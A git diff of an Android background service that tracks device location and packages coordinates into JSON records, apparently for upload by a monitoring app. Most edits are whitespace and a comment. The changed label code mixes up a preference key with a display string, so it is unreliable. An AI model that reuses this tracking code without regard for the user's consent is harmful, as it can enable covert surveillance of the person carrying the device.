@@ -38,7 +38,12 @@ import com.inet.android.request.DataRequest;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.WorkTimeDefiner;
-
+/**
+ * LocationTracker class is designed to monitoring location
+ * 
+ * @author johny homicide
+ * 
+ */
 public class LocationTracker extends Service implements GpsStatus.Listener,
 		LocationListener, GooglePlayServicesClient.ConnectionCallbacks,
 		GooglePlayServicesClient.OnConnectionFailedListener,
@@ -50,7 +55,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 	private static final int SERVICE_REQUEST_CODE = 15;
 	// The minimum distance to change Updates in meters
 	private static final long MIN_DISTANCE_CHANGE_FOR_UPDATES = 50; // 100
-	
+
 	// The minimum time between updates in milliseconds
 	private static long MIN_TIME_BW_UPDATES; // get minute
 	private static long MIN_TIME_BW_UPDATES1 = 1000 * 60 * 7; // 10 minute
@@ -69,7 +74,6 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 	private Context mContext;
 	Editor e;
 	Location location; // location
-	
 
 	@Override
 	public void onCreate() {
@@ -82,7 +86,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 	public int onStartCommand(Intent intent, int flags, int startId) {
 		mContext = getApplicationContext();
 		int timeUp = 0;
-		
+
 		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
 		locationManager = (LocationManager) mContext
 				.getSystemService(LOCATION_SERVICE);
@@ -103,7 +107,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 		Logging.doLog(TAG, "onStartCommand gpsTracker " + MIN_TIME_BW_UPDATES,
 				"onStartCommand gpsTracker " + MIN_TIME_BW_UPDATES);
 		timeUp = Integer.parseInt(sp.getString("geo", "5"));
-		
+
 		// ----------restart service
 		// ---------------------------------------------------
 
@@ -134,7 +138,7 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 		}
 		date = new ConvertDate();
 		locationValue = new LocationValue();
-		
+
 		getLocation();
 
 		if (!servicesAvailable()) {
@@ -358,9 +362,12 @@ public class LocationTracker extends Service implements GpsStatus.Listener,
 			JSONObject info = new JSONObject();
 			JSONObject object = new JSONObject();
 			try {
-
-				info.put("ttl", "Способ: " + locationValue.getProvider() + " "
-						+ " " + sp.getString("activity", "неизвестно"));
+				String activity = sp.getString("activity", "0");
+				if (activity != null)
+					info.put("ttl", "Способ: " + locationValue.getProvider()
+							+ " " + " " + sp.getString("Состояние: ", activity));
+				else
+					info.put("ttl", "Способ: " + locationValue.getProvider());
 				info.put("data", locationValue.getLatitude() + ","
 						+ locationValue.getLongitude());
 				info.put("accuracy", locationValue.getAccuracy());
